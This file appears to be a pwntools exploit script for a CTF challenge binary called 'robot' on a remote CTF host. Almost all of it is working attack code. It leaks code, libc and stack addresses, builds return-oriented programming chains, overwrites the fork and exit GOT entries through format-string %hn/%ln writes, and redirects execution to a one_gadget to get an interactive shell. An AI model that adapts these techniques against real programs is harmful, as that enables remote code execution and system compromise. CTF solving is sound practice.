from pwn import *
BINARY = "./robot"
BUFF_OFFSET = 0x880
ROP_PAD_GADGET = 0xe0
IP = "chall.ctf.bamboofox.tw"
PORT = 10100
r = remote(IP, PORT)
#r = process(BINARY)

ropchain_addr = int(r.recvline()[:-1].split()[1][2:],16)
code_base = int(r.recvline()[:-1].split()[1][2:],16)-0x138b
#libc_base = int(r.recvline()[:-1].split()[1][2:],16)-0x62830
buff_base = ropchain_addr+BUFF_OFFSET

info("Ropchain Addr: "+hex(ropchain_addr))
info("Code base: "+hex(code_base))
#info("Libc base: "+hex(libc_base))

def code_(addr):
    return code_base+addr
def code(addr):
    return p64(code_(addr))
def buf_(offset):
    return buff_base+offset
def buf(offset):
    return p64(buf_(offset))

gc_pop_rax = 0x0000000000001a4f#: pop rax; ret;
gc_pop_rbp = 0x000000000000122f#: pop rbp; ret;
gc_pop_rcx = 0x0000000000001a51#: pop rcx; ret;
gc_pop_rdi = 0x0000000000001abb#: pop rdi; ret;
gc_pop_rdx = 0x0000000000001a53#: pop rdx; ret;
gc_pop_rsi_r15 = 0x0000000000001ab9#: pop rsi; pop r15; ret;
gc_mov_eax_ptrrbp = 0x000000000000137f#: mov eax, dword ptr [rbp - 4]; mov dword ptr [rdx], eax; mov eax, 1; pop rbp; ret;
gc_mov_ptrrdx_eax = 0x0000000000001382#: mov dword ptr [rdx], eax; mov eax, 1; pop rbp; ret;
gc_add_ptrrcx_eax = 0x00000000000018d9#: add dword ptr [rcx - 0xd343], eax; jmp rdi;
gc_ret = 0x0000000000001016#: ret;
gc_fork_offset = 0xe16c0
gc_fork_got = 0x4098
#0xe16c0 fork
#0x4090 fork got

def func_add_ptrrcx_eax(addr, val):
    print(hex(val))
    gadget = b''
    gadget += code(gc_pop_rcx)+p64(addr+0xd343)
    gadget += code(gc_pop_rax)+p64(val)
    gadget += code(gc_pop_rdi)+code(gc_ret)
    gadget += code(gc_add_ptrrcx_eax)
    return gadget

rop_decode = b''
rop_decode += func_add_ptrrcx_eax(code_(gc_fork_got), (-gc_fork_offset)&((1<<64)-1))
rop_decode += code(gc_pop_rbp)+code(gc_fork_got+1+4)
rop_decode += code(gc_pop_rdx)
rop_decode += p64(ropchain_addr+len(rop_decode)+0x20)
rop_decode += code(gc_mov_eax_ptrrbp)+p64(0x0)
rop_decode += code(gc_pop_rax)+p64(0x0)
rop_decode += code(gc_pop_rdi)+code(gc_ret)

rop = b''

'''
payload = rop_decode
print((b'\n' in payload))
input()
r.sendlineafter(" : ",payload)
r.interactive()
r.close()
'''

#def libc(addr):
#    return p64(libc_base+addr)
def libc(addr, off=0x0):
    global rop_decode
    gadget_addr = 0x8*ROP_PAD_GADGET + len(rop) + off*0x8 + ropchain_addr
    rop_decode += code(gc_pop_rcx) + p64(gadget_addr+1+0xd343)
    rop_decode += code(gc_add_ptrrcx_eax)
    return p64((0x7f<<40)+addr)

'''
write(6,"MZ%36$hx",0x8)
read(3,buf,0x6)
fd = strtol(buf[2],0,16)-0x184
write(6,"MZ%(fd-1-2)c%36$hn")
write(6,"MZ%98c%62$ln")
'''


g_ret = 0x000000000002535f#: ret;
g_jmp_rax = 0x0000000000026eb5#: jmp rax;
g_push_rax_pop_rbx = 0x0000000000055ff7#: push rax; pop rbx; ret;
g_pop_rdi = 0x0000000000026542#: pop rdi; ret;
g_pop_rsi = 0x0000000000026f9e#: pop rsi; ret;
g_pop_rdx = 0x000000000012bda6#: pop rdx; ret;
g_pop_rax = 0x0000000000047cf8#: pop rax; ret;
g_sub_rax_rdx = 0x0000000000047c2d#: sub rax, rdx; ret;
g_mov_rdx_rbx = 0x000000000009bdb9#: mov rdx, rbx; mov rsi, r12; call rax;
g_mov_rdx_rax = 0x000000000013b7ef#: mov rdx, rax; ret;
g_write = 0x10d010# write
g_read = 0x10cf70# read
g_strtol = 0x49340# strtol
g_sprintf = 0x629b0# sprintf
g_strlen = 0x9d2a0#strlen
#rop = libc(0x2535f)

def call_write(fd, str_addr, l):
    gadget = b''
    gadget += libc(g_pop_rdi,0)+p64(fd)
    gadget += libc(g_pop_rsi,2)+p64(str_addr)
    gadget += libc(g_pop_rdx,4)+p64(l)
    gadget += libc(g_write,6)
    return gadget
def call_read(fd, buf_addr, l):
    gadget = b''
    gadget += libc(g_pop_rdi,0)+p64(fd)
    gadget += libc(g_pop_rsi,2)+p64(buf_addr)
    gadget += libc(g_pop_rdx,4)+p64(l)
    gadget += libc(g_read,6)
    return gadget
def call_strtol_16(str_addr):
    gadget = b''
    gadget += libc(g_pop_rdi,0)+p64(str_addr)
    gadget += libc(g_pop_rsi,2)+p64(0)
    gadget += libc(g_pop_rdx,4)+p64(16)
    gadget += libc(g_strtol,6)
    return gadget
def call_sprintf_noarg(buf_addr, fmt_addr):
    gadget = b''
    gadget += libc(g_pop_rdi,0)+p64(buf_addr)
    gadget += libc(g_pop_rsi,2)+p64(fmt_addr)
    gadget += libc(g_sprintf,4)
    return gadget

#rop += libc(g_ret)*0xe0 #pad to 0x500
rop += call_write(6, buf_(0x0), 8)
rop += call_read(3, buf_(0x10), 6)
rop += call_strtol_16(buf_(0x12))
rop += libc(g_pop_rdx,0)+p64(0x184+1+2)+libc(g_sub_rax_rdx,2) #sub rax, 0x184 to caculate pipefd address

rop += libc(g_mov_rdx_rax)
rop += libc(g_ret)
rop += call_sprintf_noarg(buf_(0x28), buf_(0x18))
rop += call_write(6, buf_(0x28), 0x20)
rop += call_write(6, buf_(0x48), 0x10)

rop += libc(g_pop_rax,0)+libc(g_jmp_rax,1)+libc(g_jmp_rax,2)

#print(len(rop))

buf = b''
buf += b'MZ%36$hx' #0x0
buf += b''.ljust(8,b'\x00') #0x8
buf += b''.ljust(8,b'\x00') #0x10
buf += b'MZ%%%dc%%36$hn'.ljust(16,b'\x00') #0x18
buf += b''.ljust(32,b'\x00') #0x28
buf += b'MZ%254c%62$ln'.ljust(16,b'\x00') #0x48

info("rop_decode len: "+hex(len(rop_decode)))
info("rop len: "+hex(len(rop)))
info("buf len: "+hex(len(buf)))

#payload = rop.ljust(BUFF_OFFSET,b'\x00')
#payload += buf

payload = rop_decode
payload += code(gc_ret)*(ROP_PAD_GADGET-(len(rop_decode)//8))
payload += rop
payload = payload.ljust(BUFF_OFFSET,b'\x00')
payload += buf

info("payload len: "+hex(len(payload)))

#print(payload)
print((b'\x0a' in payload))
#input()
r.sendlineafter(" : ",payload)
#r.interactive()
#r.close()





p = b'MZ%33$p%34$p%36$p'.ljust(24,b'a')
r.sendline(p)
res = r.recvline()
code_base = int(res[4:][:12],16)-0x1a60
libc_base = int(res[18:][:12],16)-0x26b6b
stack = int(res[32:][:12],16)
info("code base: "+hex(code_base))
info("libc base: "+hex(libc_base))
info("stack leak: "+hex(stack))
#input()
one_gadget = libc_base+0x106ef8
exit_got = code_base+0x4088

def genfmt(val,suf):
    tmp = val-0x2
    idx = 0
    arr = []
    while tmp:
        arr.append((tmp%0x10000,idx))
        tmp = tmp//0x10000
        idx += 1
    arr.sort()
    print(arr)

    P = b'MZ'
    nowlen = 0
    idx=0
    for g in arr:
        #print(g)
        P += b"%%%dc"%(g[0]-nowlen)
        nowlen = g[0]
        idx+=1
    P += suf
    return P

for i in range(3):
    fmt1 = genfmt(stack%0x10000+0x8+i*2,b"%36$hn\n").ljust(32,b"a")
    r.send(fmt1+b'\n\x00')
    r.recvline()
    fmt2 = genfmt((exit_got>>(16*i))%0x10000,b"%62$hn\n").ljust(32,b"a")
    r.send(fmt2+b'\n\x00')
    r.recvline()

fmt3 = genfmt(stack%0x10000+0x8,b"%36$hnA\n").ljust(32,b"a")
r.recvline()
r.send(fmt3+b'\n\x00')
#r.recvline()
r.recvuntil("A")
#input("Write one_gadget")
for i in range(3):
    fmt1 = genfmt(exit_got%0x10000+i*2,b"%62$hnA\n").ljust(32,b"a")
    r.send(fmt1+b'\x00')
    #r.recvline()
    r.recvuntil("A")
    #input("next")
    #r.interactive()
    fmt2 = genfmt((one_gadget>>(16*i))%0x10000,b"%63$hnA\n").ljust(32,b"a")
    r.send(fmt2+b'\x00')
    r.recvline()
    #r.interactive()
    r.recvuntil("A")
    #input("next")
#r.sendline(b'MZ'+b"a"*32)
r.send("G")
r.interactive()

#r.interactive()
#r.close()